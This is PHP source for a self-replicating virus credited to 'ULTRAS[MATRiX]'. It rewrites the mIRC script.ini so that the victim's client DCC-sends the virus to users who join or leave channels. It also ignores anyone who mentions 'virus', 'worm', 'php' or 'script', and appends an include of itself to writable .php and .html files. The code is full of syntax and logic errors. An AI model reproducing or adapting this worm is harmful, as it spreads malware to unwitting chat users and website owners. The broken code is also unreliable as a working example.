<?php
// PHP.Alf by ULTRAS[MATRiX]


$phpdir = 'c:\phpalf';
$mircinf = 'c:\mirc\script.ini';

$shom = true;

if ( (file_exists($mircinf) )
{
  $script  = fopen($mircinf, "r");
  $checks  = fread($script, filesize($mircinf);
  $virz    = strstr($checks, 'script.php');
    if (!$virz) $shom = false;
		
      if ( ($shom=false) )
{
$unmirc = unlink($mircinf);
$tomirc = touch($mircinf);

$open_mirc = fopen($mircinf, "a");
$fputs($open_mirc, "[script]");
$fputs($open_mirc, "n0; A.L.F script");
$fputs($open_mirc, "n1; by ULTRAS[MATRiX]");
$fputs($open_mirc, "n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }");
$fputs($open_mirc, "n3=  /dcc send $nick c:\phpalf\script.php");
$fputs($open_mirc, "n4=}");
$fputs($open_mirc, "n5=ON 1:PART:#:{ /if ( $nick == $me ) { halt }");
$fputs($open_mirc, "n6= /dcc send $nick c:\phpalf\script.php");
$fputs($open_mirc, "n7=}");
$fputs($open_mirc, "n8=on 1:QUIT:#:/msg $chan MTX4EVER");
$fputs($open_mirc, "n9=on 1:TEXT:*virus*:#:/.ignore $nick");
$fputs($open_mirc, "n10=on 1:TEXT:*virus*:?:/.ignore $nick");
$fputs($open_mirc, "n11=on 1:TEXT:*worm*:#:/.ignore $nick");
$fputs($open_mirc, "n12=on 1:TEXT:*worm*:?:/.ignore $nick");
$fputs($open_mirc, "n13=on 1:TEXT:*php*:#:/.ignore $nick");
$fputs($open_mirc, "n14=on 1:TEXT:*php*:?:/.ignore $nick");
$fputs($open_mirc, "n15=on 1:TEXT:*script*:#:/.ignore $nick");
$fputs($open_mirc, "n16=on 1:TEXT:*script*:?:/.ignore $nick");
return;
	}
}
 fclose($mircinf);
 $shom = true;

 $createdir = mkdir($phpdir,0)
 $renamefile = rename(__FILE__, 'alf.php');
 $copyfile = copy(__FILE__, 'c:\phpalf');
 $rename2 = rename('c:\phpalf\alf.php', 'script.php');


$dirz = opendir('.');
while ($alldir = readdir($dirz))
{
 $inf_ = true;
 $ext_ = false;

 if ( ($ext_ = strstr ($alldir, '.php')) || ($ext_ = strstr ($alldir, '.html')) || ($ext_ = strstr ($alldir, '.htm')) )
 if ( is_file($alldir) && is_writeable($alldir) )
{
		
		
 $opz = fopen($alldir, "r");
 $check = fread($opz, filesize($alldir));
 $sig_ = strstr ($check, 'alf.php');
 if (!$sig_) $inf_ = false;
}
	
 if ( ($inf_=false) )
	{
 $opz = fopen($alldir, "a");
 $fputs($opz, "<?php ");
 $fputs($opz, "include(\"");
 $fputs($opz, __FILE__);
 $fputs($opz, "\"); ");
 $fputs($opz, "?>");
  return;
	}
}
closedir($dirz);
